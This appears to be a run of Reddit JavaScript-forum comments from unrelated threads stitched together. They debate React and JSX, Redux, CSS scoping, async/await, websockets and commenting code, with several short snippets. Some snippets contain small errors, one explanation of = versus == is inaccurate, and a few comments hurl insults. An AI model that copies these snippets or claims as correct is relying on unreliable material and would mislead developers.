Its true that state is best left outside components, esp for large projects. Redux is an amazingly boilerplate heavy solution to this with tons of meaningless mechanical code and is a total mess without using a hundred additional libs such as thunk/saga/reselect/middleware etc. This is not good engineering. React is successful because of its big scope but small api surface area. We need a better abstraction than Redux. e.g. I think an immutable graph data struct should have been the default React state representation, thus making the whole thing far more efficient without needing shouldComponentUpdate.
&gt; good reasons Such as?
You'll get there!
My complaint, even before React, was that this idea of "separation of concerns" is not fully considered on the web. Sure, there was a time when HTML was "content", CSS was "styling", and JS was "behavior", but in modern applications the three are completely interdependent. If JS is applying a class to a UL and that class collapses the list, you're just spreading your problem across three files (and connecting them with a global naming system that's hard to enforce and easy to break). React's component structure moves your "concern" — the component itself — into a single file or folder where it can be easily understood, modified, moved, and even reused with ease. I think React acknowledges what a lot of us have thought for a while; that *languages* aren't separate concerns, *features* are. 
What makes this different then underscore.string? At first glance they both seem to provide the same string manipulation methods and both libraries allow the methods to be chained. Is there a real advantage over using Voca.js to Underscore.String?
using aphrodite basically solves all that for us. https://github.com/Khan/aphrodite
clearly whomever said that has never had an actual job. in the real world, if you dont comment your code, then you're a lazy asshole.
Yes — but I think we've reached a point in web dev where "excess information" is harder to define. If I need to serve a user a pageable image gallery, myself, the product manager, and the users would define this feature as "a group of images that shows one image at a time and advances when the page buttons are clicked". Splitting this feature into HTML (view a stack of images), CSS (view them nicely arranged) and JS (enable click-to-page behavior) doesn't do anything for me, because none of those things on their own define an image gallery based on the specs I have been given. The full feature is all three things combined, and the simplest way to manage a combined feature like this is to put it, if not in the same file, then in the same location. I think the web's idea of separation across language barriers comes from an early philosophy that CSS and JS were "extras", and HTML was the heart of the web, but if you look at modern web interfaces I think you'll see that all three are essential. React is a library for rendering interfaces (any interface, not just web), and as such, I think it takes an appropriate step by moving these interfaces out of separate places — loosely connected by classnames — and into single locations. Still, it does feel very alien (and at first, inconvenient) to build this way, and I understand the shock the web community has been feeling seeing a lot of these long-held ideas get thrown away.
Why?
FYI, the code in this hot take is from the front page of the Preact website (notice that props and state are being passed to `render()`, which isn't the case in React): https://preactjs.com/
Yeah I don't think OP was saying that the way that ClojureScript does it is the best way, but that what the guy in that talk is saying is applicable to both templates vs JSX and templates vs CJS
Modern Web apps are build using components. These components are built using JS, CSS and HTML. They are standalone, have perfect separation of intent, and are totally pluggable. There is no longer the need to isolate HTML, CSS and JS because components does that already and better. If a person doesn't understand this, there's no point explaining it to him.
You're an obtuse motherfucker arentcha
Your server is parsing it for you then. Look through documents talk to them etc. If you trust they have a good parse mechanism. Use that as a parsed json!
Yeah, poor scoping is the cause of the problem, so why not let a compiler take care of it for you to make sure that it always gets done well?
Yep. Its abstraction, plain and simple.
you'll understand when you get a job one day.
This was happening in Dojo years ago, and you didn't need to inline markup to do it...
It doesn't support TCO? Wow... that would be a huge improvement.
Yes, but I don't think separation of concerns was the reason why. The concept of templates and controllers still exist in Angular2, just under different names. Here's a snippet of code showing how template, logic, and style are still separate in Angular2: https://angular.io/docs/ts/latest/cookbook/a1-a2-quick-reference.html @Component({ moduleId: module.id, selector: 'movie-list', templateUrl: 'movie-list.component.html', styleUrls: [ 'movie-list.component.css' ], }) 
I don't see any HTML or CSS in that code... just javascript (and JSX).
The question is why are people trying to write Javascript in XML?
And still, I have the feeling in two years nobody will talk about React and I hope people will remember their down votes to my words ;)
https://xkcd.com/505/
IMO the todo list, while trivial, isn't unrealistic. An app may be made up of a lot of simple components with localized state.
You're right on the money on all of this, but I still prefer regular CSS over js objects. :x
I haven't used Dojo, but from a quick look it seems to fall into "the less old way" I described above, similar to Angular. Template strings with string variables magically bound to model properties. If you want you can definitely avoid inlining JSX into JS: // myTemplate.jsx var React = require('react); module.exports = function myTemplate(foo, bar) { return ( &lt;div onClick={foo}&gt;{bar.baz}&lt;/div&gt; ); } [Presentational](https://medium.com/@dan_abramov/smart-and-dumb-components-7ca2f9a7c7d0) React components are an extremely thin wrapper over this, allowing for better code organization.
TLDR: &gt;Node.js is a program that converts javascript to machine code by embedding V8 engine in its C++ code and provides humongous capabilities to Javascript and monstrous power to Javascript developers 
&gt; Fuck beginner friendly, easy to understand code. Its too much trouble. I don't think anything about React is inherently difficult to understand or unfriendly to beginners. But I guess that depends on how one defines beginners. I think that a framework should be approachable to someone that started programming a few months ago or a first year cs student is **not** entirely reasonable -- sort of put words in your mouth sorry.
why?
Not wanting your styles to cascade is like not wanting an engine to cycle. That's fundamentally how the technology works. You can't just change it and expect the world to work properly.
https://www.youtube.com/watch?v=0ZNIQOO2sfA
&gt;[**Separation of concerns RANT - MPJ's Musings - FunFunFunction #47 [20:08]**](http://youtu.be/0ZNIQOO2sfA) &gt;&gt;Separation of concerns is pretty misunderstood concept, in programming in general, no just JavaScript and web development. I talk about separation of concerns in the context of React and combining HTML, CSS and JavaScript in one place, but also in the more general programming sense in function extraction. &gt; [*^funfunfunction*](https://www.youtube.com/channel/UCO1cgjhGzsSYb1rsB4bFe4Q) ^in ^Science ^&amp; ^Technology &gt;*^16,220 ^views ^since ^Aug ^2016* [^bot ^info](/r/youtubefactsbot/wiki/index)
I don't think it's possible, but you can use window.onerror I think uncaught errors go there
This. Making restraints in languages and frameworks always had a purpose of keeping noobs in some borders of sanity, not making experienced devs uncomfortable for no reason.
If you don't use components, inline styles and javascript do not scale, nothing changed here. But with components they do, which is why the old best practice does not apply.
Which compiler does that? Genuine question.
Yay let's use another mysterious add-on that isn't included in framework because apparently *media queries and pseudoelements* are not that necessary...
AngularJS = Angular 1 Angular = Angular 2+ Yeah it's annoying, but they are basically trying to follow semver and not end up in the big bang approach that was the move from 1 to 2. In Angular 2 though, you can have all your css, html and js in the same file.
They're still separate technologies and I think it's important to recognize that they are very different and handled by browsers in entirely different ways. It lets you understand what will be efficient.
JSX is just syntactic sugar you could scrap it altogether in fact and not change how react works. I hardly think it's some grand third stage in the oversimplified evolution you mention. It's like coffeescript or something. A convenience tool that can increase efficiency but it comes with the same tradeoffs that any pre-compiled abstraction does (learning curve, more moving parts, less visibility, more complex workflow etc)
Essentially, yes. Every so often the browser will scan for objects that can be deallocated as they are no longer referenced and memory that can therefor be freed for other use. See https://en.wikipedia.org/wiki/Garbage_collection_(computer_science) for a bit more background. *Generally* this works our more efficient, sometimes significantly so with large and/or complex object structures (as seen in the DOM and JS objects of many games) than checking upon each object dereference, and it saves you from needing to care about some parts of memory management that could otherwise bog you down - *but* the process can take a noticeable amount of time during which it can block other processes and you the programmer have little or no control over when it happens which can be significant for a game: if it happens while your code is in the middle of producing an animation frame that frame could be delayed and make the display look jerky. It doesn't just affect high framerate games either: a small extra delay even between frames produced at a slow rate can be quite noticeable to the human observer as a break in smoothness (even if you make up for it by the next frame arriving faster to "catch up").
I think the problem is that we're mainly trying to find a process. People over processes and all that. I come from a similar background as yourself. We were splitting up css/html/javascript for an Angular app. It was absolutely hell. It was horrible to find anything and you had to dart across multiple folders just to find the class name you wanted. And that was assuming the class name wasn't duplicated! Of course - this is solved by group-by-feature and something like BEM or SMACSS (or some other acronym). My point being that it is still possible to do bad things with supposedly good tools. --- As a side note, something I haven't seen mentioned here is that if you were to split a React component into a HTML file you'd have to either use the DOM directly or have your own HTML parser a la Angular 2. Personally, I think React chose the right option by doing neither of these and simply having an *optional* syntax extension that translates to function calls instead. JSX looks like HTML but is actually just a series of function calls when it is desugared
So, the main contenders right now are: - Angular 2 - Svelte - Vue The above all have in-built style-scoping that will generate scoped classes for you. There's also CSS Modules. This is one that I originally loved but am a little more wary of. CSS Modules is essentially a [specification][spec] that defines some syntax extensions to CSS: :local(.myStyle) { color: red; } If you were to import this into a JavaScript file when using a plugin for your preprocessor (babel/webpack/whatever) that supported this spec, you'd get back an object of class names to randomly generated ones - something like this: import classNames from './style.css' console.log(classNames) &gt; { myStyle: '1237984192rasdhoasdh' } You'd then use that as your class name rather than the original one. The reason why I'm wary of this is because it is not part of any CSS specification and so is volatile and is not actually on the roadmap of being adopted by any browser or native version of CSS, which means I am implicitly tying part of my build process to a third party dependency. Of course, you can make the same argument for JSX (and you'd be right), but JSX is supported enough IMO that it's acceptable currently (first class support in TypeScript and plugins for Babel exist). [spec]: https://github.com/css-modules/css-modules
2 years of ClojureScript and everything makes sense once again.
If only I could find a way of getting my editor to use the right linter and syntax checker for each section. I ended up using component folders with a . js, .html, and .css file in each and used webpack to mash them all together.
Separation of languages is easier to recognise than separation of concerns, but the latter was always the goal. He just hasn't realised that yet.
Anglarjs was a mistake, angular2 is awesome 
the console is like a toilet. You can look at what's in there with your eyes, but touching it with your code is out of bounds. (I am the authority on this, as I am currently pooping on a toilet) 
Then they should've set it free and not basically kidnap the whole project. Here we have a perfectly fine proxy for node but we don't have that for bower and our proxy doesn't work well with it. And our IT (for some reason) doesn't want to make a bower exclusion as well, so we can't do any prototyping to show how fine it works. Also they kinda stopped the big progress of the project by not having people constantly working on it anymore that previously added a lot of content. I don't mind that they prefer Angular, but it seems that because of this they ran Polymer into the ground and now it has lots of problems gaining enough traction.
And switching editors isn't an option?
Agreed, plus two years is huge in terms of web dev- though considering Khan and Airbnb both use it in production sites, I'm pretty comfortable with using it for us in production so far, it's made our codebase of components super easy to maintain 
Code samples like this look fine but thats because they don't really hold any value for real world use cases. where are the exceptions to display x or y? Where are the different stylings for certain cats? And where the hell is the comment explaining what you are doing and why? Add all these things and it becomes much more complex and more difficult to read.
It will never gain traction, and honestly I'm okay with it, there is no particular reason for it to exist when angular solves the same problem and way better.
Oh i'm sure it works well now and that big companies use it so its a bit better maintained than others. But like i said: i still need to provide support in the future on projects i did ages ago. And while it might work fine now, i still need to work with it in the future. Having to require various modules to accomplish tasks/features/hacks is not what i can really advice to my managers of which we should use. Also having big corporations using them is nice, but is hardly a guarantee that it will last. Those big corps (especially the big startups you mention) are often switching around because they are still looking for that optimal way to do things. I wouldn't be surprised that they move on to Vue or something else in the future as well
I found webcomponents to be more future-ready than Angular really. Or how they go about getting each component a decent readme and example. Seems more fit for big projects and company frameworks.
I'm not sure it's an abstraction either. It's definitely a new organization, and it's arguably a new representation (even though it's still just HTML, JS and CSS).
[Aurelia](http://aurelia.io) FTW!
I think this comment from [Rob Eisenberg on Hashnode](https://hashnode.com/post/does-react-really-violate-separation-of-concern-by-putting-html-and-js-in-a-single-file-cil3bn5hj0011a65347rsdut0/answer/cil4sxqi500ifz35376gehp4e), is good answer to this. 
Why would this cause me to want to switch editors? Besides, it doesn't work properly in either vim or vscode so it's not a fault with either one in particular. 
I come from a Java/PHP world so I asked myself that as well when I first encountered React, because things like this were considered bad practice in those languages: &lt;?php for ($i = 0; $i &lt; 10; $i++) { ?&gt; &lt;span&gt;foo&lt;/span&gt; &lt;?php } ?&gt; Many people say that "it's JSX, so it's actually OK because it's all JavaScript". In my opinion, that's wrong, because both JSP and PHP are just "Java" and "PHP" as well. However, the main difference between those and React is that we're now evolving to component-driven design, so we just chose to separate in a different way. I like the component-driven design, though even with components, I still prefer to separate my logic as much as possible from my view, so I guess that's why I prefer Angular/Aurelia/..., though I completely understand why React went the way they did.
 canvas.removeEventListener('mousedown', dragStart); canvas.removeEventListener('mousemove', drag); canvas.removeEventListener('mouseup', dragStop);
I bet it was cancelled in favour of observables.
Easy. The people who have the most time to participate in discussions also have the most time to watch videos. Relevance and brevity were replaced with Twitter, and long form replaced with let's plays. [screams internally]
Disclosure: self-submission.
Crashed WebGL for me too; Chrome on Windows 7. Doesn't affect any other browser tabs or the computer itself though.
Umm, can I ask what does this front-end app do? That's an enormous amount of code...
I should have said "should be" outside the scope of cancelable promises. If you want input into the behavior of a potentially long running task, promises are the wrong tool. Going back to my first point, I think cancelable promises are a misunderstanding of what promises are supposed to be. They are about inputting data into a black box and knowing that you will eventually get back a result or an error. If you want future input into what that black box is doing over time, you shouldn't be using promises. Good ol' functions, events, or even streams are a better approach.
PHP was created in 1994, Apache – in 1995, Javascript – in 1995, and Node.js – in 2009. A lot has changed since 2009. PHP programmers have learned to use event loops, callbacks, and non-blocking I/O with ReactPHP. In 2015, PHP 7 with new long-expected features was introduced. Possible differences in performance is already not an issue when one compares “Node.js” technology with “PHP” technology. https://belitsoft.com/php-development-services/php7-vs-nodejs
Lol I don't know who are you working with but I certainly don't see people who argue jQuery is the best way to do frontend around here.
Styles exist outside of CSS. You can have non-cascading styles. It's part of the HTML spec. You are wrong.
Yeah I know Dojo wasn't exactly the same as react, but it was doing things a better way, like 10 years ago... So everyone always compares things like jquery against angular and react, when jquery was always the shittiest solution out there - it was just the easiest. 
You can use CSS in JS without a framework if you are really determined... That's not an argument, if React advises using CSS in JS components and has some system that supports that, then it should also support media queries and everything...
Cool idea! I see the architecture is similar to redux. How would this differ from using redux with redux-observable middleware?
I'm fairly new to this whole thing the kids are calling "world wide web development", but I'm sitting here re-writing a website front-end that runs on a Django back-end at a company where large portions of the developer community would probably take RoR as a spouse if the laws in Missouri and Kansas allowed it. They also love the idea of building out UI and layout helpers with the back-end. From where I'm sitting, React is Turing Prize-worthy, because our big UX/UI resources project will be open-sourced and done in React. No more conflicts between RoR and Django projects... we turn the back-end interface into an API, make React components that consume and manipulate that data, and slap it all together using a common, defined toolkit (Webpack, NPM, ESLint, etc.) which eliminates a lot of second-guessing on my end. It also eliminates a lot of jQuery and formalizes the manipulation of state in the application. Maybe I'm missing something here (probably, I haven't been in this game as long as most of you), but... if we can eliminate the intermingling of back-end concerns and make reusable components that fit into a common design framework as a company, that's a massive win.
Wow this seems like exactly the thing I need for my current app. Cool stuff
The author of that tweet apparently blocked me on Twitter, and I've never interacted with him at all AFAIK :/
Wow I really love this idea, pub sub and graphql sound like a perfect mix
Definitely fair to say that try catch isn't optimized. I agree 100% with that. If you are working with high performance applications I can see the need to avoid them. I think in many apps though it isn't bad to have a few around the network calls that are made. In regards to memory allocation: You pointed out that try catches are not optimized. Would you also point out that using more memory when you don't necessarily need to is also not optimized? My reasoning for more variables being an issue is simply that a human programmer can only keep so much in their head at once. In most cases, the less variables, the easier to glean.
Yes definitely. I think in some cases it would be nice to even still use `const`s and allow for different errors to be stored for more custom error handling.
As a Java developer myself, I _have_ used reflection on other people’s code. But I 100% agree you can go through life without ever doing it, the use cases are uncommon.
Yes, this is exactly the problem. I don't know how difficult it would be to make a change in the language, but having control over when GC happens, or even having control to the level of *having the option* of turning it off entirely and manually "disposing" objects would be ideal.
Get over it
Interesting idea; you could actually go a bit farther than Go's solution (which I know takes a lot of flak for all the `if (err != nil)` boilerplate); and copy Rust instead. Rust has a `Result` object, which represents this idea of an operation that either produces a value or an error; and to get either you need to work through the methods of the `Result` object, and it provides some conveniences that simply returning an `[err, res]` array doesn't provide. //basic usage is a bit of boilerplate if(result.wasSuccessful()) { //throws error if wasn't successful, otherwise returns the value const value = result.get(); } else { const err = result.getError(); } //but you can do stuff like: const value = result.getOrDefault(5); //defaults to 5 if the result was an error const value2 = getOrElse(function () {return 5;}) //More flexible equivalent to above //if result was an error, mappedResult has the same error, // otherwise it's got result's value plus one const mappedResult = result.map((x) =&gt; x + 1); //Or if you want to fall back into a try-catch pattern: try { const val1 = result1.get(); const val2 = result2.get(); const val3 = result3.get(); } catch (err) { //Either one two or three failed } //Or you could combine results: return result1.and(result2).or(result3); It's a lot more of a powerful pattern than the Go pattern; pretty much all of the above would be a lot more boilerplate with simple `[err, res]` arrays. It's not a perfect translation because a lot of the power comes from the ability for the compiler to check that you're using it correctly, in Rust. (Though I think you could achieve something similar with type guards in Typescript)
You'll need to supply more information then.
I'd suggest printing out this thread to go along with the gift. He'll probably get a kick out of all the friendly pedantry. 
&gt; A well written react component will look a lot like a clean HTML template That's simply impossible by the very nature of JSX, the bigger the component the bigger the mess.
But somehow is single threaded and only works for passing messages from MQ to browser via web sockets.
Tough luck.
if (user == "herobrian51259") { document.write("You are cool!"); } else { document.write("You are not cool!"); } Errors: 1. Condition should go inside () 2. When evaluating a condition use == or ===. One = goes to assign values to variables, it always return true, == is a comparission between 2 values. === is a strict compare between value AND type. 3. Please use a semicolon after each instruction. For example, at the end of the document.write(); 
Interesting. Thanks for the info.
Got to maintain that filter bubble
this isn't a troll. you clearly dont know what that word means. sorry, but employers who have lots of contractors coming and going, working on the same code, want the code commented. I clearly stated that comments are never "needed", and it has nothing to do with my, or anyones elses ability to "code". clearly you have little experience in the real world, and dont understand all the reasons why comments are a good thing. you also clearly have limited experience with different languages and applications of those languages. often times comments are related to business rules, or why and when a change was made. anyone can read code and know what is being done, but in certain circumstances, especially when processing data, it can be unclear why those things are being done. analyzing code is one thing, but analyzing code that is analyzing data is another. 
Agree, one of the problems with js is that allows you to be lazy and not check types XD
Dynamic sizing? Couldnt the first two panels just have width (50%); followed by a js update of those properties upon any nodes inserted via dnd? 
But it never works anyway. You're kidding yourself. There will always be different types of developers. Me, I'm one who is a bit OCD about the formatting and ESLint is my God, but there are others who just want to get the job done by hacking stuff in. You're never going to stop developers always doing what they wish.
u/CaRDiaK mentioned not wanting to hunt across multiple files. I replied directly to that concern by saying that it's debatable whether hunting across multiple files is worse than the additional nesting caused by combining the files into one. Seems like my reply has pretty much everything to do with what I was responding to.
Because this is the most efficient way, when you can create component abstractions. Basically when there's just a screenful of code per component, and the idea is to compose components with no side-effects - just jamming all kids of code produces terse apps that are easy to manage. 
Reflection was way more relevant in javas earlier years when verbosity was way more an issue. Random thought - I would love to have es6 style destructuring for Java objects.
The underscore library might help you out
Huh, well that is pretty swell, I'll have to look into it. 
Looks cool, I'll have to write a binding to my http://github.com/rekord library!
Not worth arguing over. They either are a troll or just jumping on the "Angular Sucks" bandwagon so they can feel like they are part of some sort of rebellion. Every argument against angular in the comments has no actual merit.
Try it like below. var records = []; //elements e.g. {operator:"unique name", count:5} //process function argument can be a JSON string or object. //if it's an object, it's assumed as an array object. function process(json) { if ("string" === typeof json) { json = JSON.parse(json); } json.forEach(function(item) { var i, newName = true; for (i = 0; i &lt; records.length; i++) { if (records[i].operator === item.operator) { newName = false; records[i].count++; } } if (newName) { records.push({operator:item.operator, count:1}); } }); } //e.g. ... process('[{"taskid":"some number", "taskdate":"some date", "operator":"abc"}]'); process('[{"taskid":"some number", "taskdate":"some date", "operator":"def"}]'); process('[{"taskid":"some number", "taskdate":"some date", "operator":"abc"}, {"taskid":"some number", "taskdate":"some date", "operator":"def"}]'); process('[{"taskid":"some number", "taskdate":"some date", "operator":"def"}, {"taskid":"some number", "taskdate":"some date", "operator":"ghi"}]'); console.log(records); //[{"operator":"abc","count":2},{"operator":"def","count":3},{"operator":"ghi","count":1}] 
We're excited to bring enterprise-level data extraction to the open source community. Our library handles scaling with fault tolerance and built-in parallel processing in addition to handling HTTP request limits using proxies and customized request throttling. We'd love to see what you can do with Siphon! Feel free to give us feedback on our Github :)
Brilliant! Looks like a must use for my next real-time web app.
**Whoever is reporting links as "off topic", please post your reasoning either in the report itself, or in the post as a comment.** As of right now, your reports are being considered as trolling, and if the behavior doesn't cease (or the feedback improve), I'll get the admins involved to sanction you for frivolous reporting. None of your reports for "off topic" have been accurate that I can recall. edit: I realize that there's a chance whoever is doing it will never see this, but thought that a public notice might work before I have to involve reddit staff. Also, sorry /u/homoiconic for littering your post with this notice!
So another template project....
Tab is \t
If you use babel there is no such thing as a compatibility problem. You're not the only one ; but I like how clean and readable my code looks with *async/await*. Async (the library) is a fucking pain in the ass to read, on the other hand. And anything it does can be achieved with basic mapping and reduction using Promises functions, which are native now.
My problem with async is it leads to a bunch of one off functions that pass around arguments through a long chain ... simply because I need them at the end of the chain. I'm sure for small applications or small use cases it's fine, but I need better code reusability in larger apps. Promises are basically native now and much better than async. You still have to pop a variable out a long chain to return it at the end (for example you need to return the results of step 3 in a 7 step chain). Generators are great for getting rid of that, but still kind of weird for async requests. Await / async really is the best option so far. I can't think of a situation I'd voluntarily pick the async library now. 
And you could add syntax higlighting in your docs (write ```javascript (three backticks and "javascript") in line before code block)
No I'm definitely saying you *should* develop without JS in the HTML. That has been the prevailing wisdom for over a decade, and pretty much any JS/HTML tutorial worth its salt should teach you that. JS in HTML is hard to read, hard to write, annoying to debug, and it doesn't even try to separate concerns. Yes, you have to make sure the right elements exist, but it's better than the alternative. --- Using JS to add event listeners to elements has been the gold standard "vanilla JS" way of doing things for ages. Most "traditional" frameworks provide some sort of data-binding: where the framework will manage the work of connecting your JS and HTML, to avoid the need for `getElementById` stuff. They often by replacing or augmenting pure HTML with a template language: the templates references the JS code in some way, but it still keeps JS and HTML separate. And then "react"-style frameworks have to HTML controlled by JS; this violates the traditional "no-HTML in JS" idea (hence "rethinking best practices"): it does this because React, instead of dividing code into JS vs. HTML, divides its code into "JS + HTML" components. It's a different organization structure with its own advantages and disadvantages. 
Correct. I tried the following in the first array, but it didn't work. It was only displayed as: Profits: $83,223.33 var1 = "Profits: $" + "\t" + "\t" + num1.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
Rule of thumb - if all of your react components have a 'render' that returns 'null', it probably shouldn't be a react component, it should be a library...
This seems to be more about routing your errors through a callback (which I don't think is a common use-case with async functions). You could instead write your async function without callbacks and decorate it to manage results/errors with a callback: function promiseCallback(asyncFn) { return (...args) =&gt; { const callback = args[args.length - 1]; args = args.slice(0, -1); return asyncFn(...args) .then((result) =&gt; callback(null, result)) .catch(callback); } } const add = promiseCallback(async function(a, b) { return await Promise.resolve(a) + await Promise.resolve(b); }); add(3, 5, (err, result) =&gt; { console.log(err || result); });
Yep, I have a whole page in my React/Redux links list pointing to articles on testing React and Redux: https://github.com/markerikson/react-redux-links/blob/master/react-redux-testing.md
Just updated the README to include syntax highlighting and a gif of the timeline component. Thanks for the feedback!
No. It's a regular interpreter like this http://math.chapman.edu/~jipsen/js/
Like that or exactly that? \t renders as a tab on that interpreter.
Hi, thanks for an in-detail response, which helps to see the situation other React developers / teams are in. I have a Q, though: are you working using redux, redux-sagas and so on? If so, do you have the Hot Module Replacement configured so it doesn't need a full reload of the page whenever a redux-y component (with its mapDispatchToProps, mapStateToProps, etc.) is edited/changed? Also, my HMR env always triggers a full reload on each edit of any action, reducer or saga file. Is this the default behavior or are there some kind of workarounds that'd prevent such behavior (for faster development, obviously)? The less full reloads HMR would require in certain cases, the happier I'd be with it.
I'll be adding a guide on how to add authentication to existing projects.
Has anybody used firebase solely for authentication? I use it for pretty much everything and was wondering if its worth its single services too.
&gt;Yes, you have to make sure the right elements exist, but it's better than the alternative. I'm not convinced. if i'm binding events to buttons it make sense to have those functions in the element itself. you're executing "passive" code that can be re-used. if the code doesn't exist the button loses it's function but the page is unaffected. If you can't find the element you want to act on, or your code is present on the wrong page and the element doesn't exist at all then you javascript *file* breaks and stops executing. I can respect a clear separation of files, but your setting yourself up to with a need to create large swaths of parallel operations and checks for only handful of cases. 
Not a problem. Any chance that somebody wrote an anti-spam bot that is a little too eager?
I've coded JS for almost a decade, and worked professionally with JS for the last 3 years, and I've never heard *anyone* advocate for inline JS. If you're doing anything with the slightest bit of complexity, inline JS is a nightmare. But, if that's the way you want to roll, go for it. 
design pattern?
This can be done in a much easier way than the other comments suggest. var input = JSON.parse(jsonFileContents), counts = input.map(function(task) { return task.operator }) .reduce(function(acc, operator) { if (acc[operator]) ++acc[operator] else acc[operator] = 1 return acc }, {}), countObjs = [] for (var operator in counts) { var countObj = {} countObj[operator] = counts[operator] } This could be made more concise if you used ES6, but I didn't want to assume. Disclaimer: typed on mobile. 
oh , it was just this project idea i had to teach myself programming. I had always wanted to make something like guitar pro for the web . Are you the creator? the site looks great :). 
The vast majority of our JSX components are pure functions that take props and return react elements as JSX. Most of our business logic and state management is implemented in Redux and Redux-Saga. In the few cases where a component manages its own state, there are local functions in the component that handle UI events and state transitions. This logic is entirely linked to the specifics of *that* component, and is in no way shape or form re-usable. To pull that logic out of the component would just move it someplace else, and create a 1-1 association between the component and its associated logic. This is not separating two concerns, this is dividing a single concern into two files.
Interesting. You mean just use firebase as an authentication db, and something else for your app db?
Still not sure why you would prefer inline css over external css file. Especially when debugging the dom is much easier to read if you keep it simple with classes. Also: how many symbols do you really need for your code? It feels like soon we need to start remembering all kinds of alt+codes in order to write some Javascript because somebody found "æ" to be a handy bootstrapper name. 
It's a good method, though since you are checking for `num &lt;= 0` each iteration, you could make it `while(num &gt; 0)` instead and cut out the break line. Besides that and throwing a `RangeError` to emulate the proper `String.prototype.repeat()` functionality, this is definitely optimal.
TIL &gt;&gt;&gt;= 
there are some strategies that use Cuda-style on the GPU, other strategies that use the CPU. Intel is backing Khronos' WebCL, so obviously there are CPU strategies. I've written some CPU kernels using Intel's River Trail back in the day, but we are waiting on Khronos' (finalized) spec to become standard in browsers instead of with plugins. 
Maybe check https://mixitup.kunkalabs.com for performance examples 
fair point. but this is strictly an api server (not serving anything). i just meant there are a lot of utility functions boilerplate needed around error handling, logging, and etc. i could be just whining though. so you would recommend express?
But you still need to host the data somewhere
Your application data, sure. All your auth data is managed for you. 
Ahaha, I just did this the other day and it was 10 lines of code to use the API in a react component. No need for an npm package.
The *one* time I've found it to work really well to break this general rule is when you are rendering something even if it is not a DOM element. For example, layers that live on a canvas. I do this with OpenLayers in my React app to huge success. It makes it trivial to reason about the lifecycle of my map layers as they behave identically to my other react components.
One react component hipster down
That's great and all, but I like my one-liner: function repeat(string, repetitions) { return Array(repetitions).fill(string).join(''); } :P
Client or server doesn't support websockets? Its 2016. When will that ever happen? Opera mini is the only current browser which doesn't support websockets natively. How could your server can use a websocket library but fail to support websockets? I guess its possible if you haven't configured your load balancer correctly. But that can happen with long polling libraries too. Also all the popular load balancers work great with websockets anyway. What about that corporate proxy? If you run WS over HTTPS then thats not a problem either. And if you argue that you 'just don't need to worry about things like that with socket.io', you're wrong - you do. The fallback methods don't work straight out of the box with all load balancers and stuff. And switching to fallback methods can arbitrarily reorder messages (!!). If you aren't testing them in all the environments your socket.io app runs in then its probably broken. Unlike WS over HTTPS which works great everywhere. To be clear about where I'm coming from, I'm a stickler for correctness in my tools and I've used socket.io from some of the very first versions. I've ran into all sorts of obscure little edge cases where it was clear that the socket.io devs just didn't understand what TCP sockets are and the guarantees they provide. If you're ever going to insist that raw websockets aren't good enough (they are), then [sockjs](https://github.com/sockjs/sockjs-node) is a much better choice. Its made by some excellent vmware engineers. And if you just want a cleaner API on top of WS then take a look at one of the many many reconnecting websocket client wrappers available on npm. Socket.io is deprecated junk.
Thanks for posting. I've been wanting to switch my current angular project over to typescript and i keep getting lazy. It just really reminds me of writing in Java again, but it'll be worth it I think
thanks
Hi /u/brunocborges, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index).
I think it also depends on who writes it, their experience level, and how well thought out their solutions are. 
Use Sails. I run multiple Node REST APIs in production and I use Sails for all of them. Sails in an MVC Framework built on Express. You get the benefit of Express, but you get a lot more like better middleware support, security via CORS &amp; CSRF protection, an ORM, an MVC framework, and access to services. Express is a little too low-level for production REST APIs in my opinion. If you're interested in learning more. Check out Sails or Bedrock Sails: http://sailsjs.com/ Bedrock: https://tilomitra.github.io/bedrock/ Feel free to PM me if you have any more questions or just want to chat about this.
I agree with u/idownvoteallposts. What you're feeling isn't native to just jQuery let alone, Javascript, but all programming languages. It is more of a reflection of the developer's experience. jQuery's low barrier to entry attracts more novice/amateur developers who tend to write messy code (especially the copy paste coders). 
Clever, that way you don't need ES6 either (where it's already redundant).
Don't blame the hammer for the faults of the builder.
i suggest testing thoroughly as depending on what you're calculating as long as it's on the main thread it will affect perf.
I would not call a linter or a git hook a design pattern. The description given on [wikipedia](https://en.wikipedia.org/wiki/Software_design_pattern) is more accurate imo.
&gt; Many people think the JSX approach of conflating HTML templates with JS is pretty gross. That's not really much of an objection. I think you'll find the actual objection is generally phrased more like "but what about separation of concerns"? &gt; then not outlining those reasons beyond anything other than "I dislike them being in separate files." Is that all it is? Again, it's about separation of concerns (and the closely related single responsibility principle). * If a single change requires you to open multiple files, then that's 1) bad for maintainability and 2) a strong sign that you've spread a single responsibility across multiple files. * If there's multiple types of changes that might make you open a file then that's 1) bad for maintainability and 2) a strong sign than you've lumped multiple responsibilities into a single file. That's really the entire argument. Anti-JSX people are (basically) suggesting that the structure will lead to more of the second, but won't stop the first. Pro-JSX people are suggesting that the structure will lead to less of the first and won't lead to more of the second. It's not about whether you "like" them being in separate files, or whether you think it looks "gross"; it's about whether the principles of software engineer argue for or against a particular structure.
Oh this is awesome. Add an option for number of slices? Are you familiar with Seb Lester? He's been using something similar: https://www.instagram.com/p/BOPl_naglFP/
So then you're also in support of people who mix PHP code with HTML as single files as well? Because that same argument should apply to that as well. And as I understand it, doing that was considered a pretty enormous antipattern.
I find pure React to be less opinionated, as you can use React and ReactDOM as a pure view layer. Common libraries like Flux/Redux, ReactRouter, etc. obviously make the stack opinionated, but pure React I find to be closer to an un-opinionated tool. You can use whatever MV* framework you want and then just use `ReactDOM.render()` to replace a templating library like Handlebars or Jade. On the other hand, Angular I find to be a much farther reach because there's no way to use Angular (1 or 2) without buying into the Angular paradigm. It's the ng way or the highway. Another great example of an un-opinionated library is Backbone. Minimal footprint, you can use pretty much whatever you want inside of a Backbone app and you can use as much or as little of Backbone as you want.
With Promise, you better flatten by chaining them to avoid nesting. Is it possible to do the same with async/await?
Great. Let me know if you encounter any issues. 
&gt; jquery is a framework akin to Angular I get what you're saying, but I still think the article is fair in this comparison, because it does give insight in adoption of the most modern tools across already deployed websites in the world. Sure you could use jQuey alongside React and Angular, but most likely you wouldn't.
Your list is really solid, thank you.
Yeah and I also feel like when I have to write just a little to prototype an idea : "Aw this will be buggy / slow if I ever use it in an other project" I feel like it's not pure or something haha Yeah I'm probably messed up
Sorry, it appeared to be for Java (we get tons of java posts here), and I didn't see anything on the landing page that mentioned javascript, but when I went and checked it a second time I do see that it includes JS. I'll restore it, or you can post again.
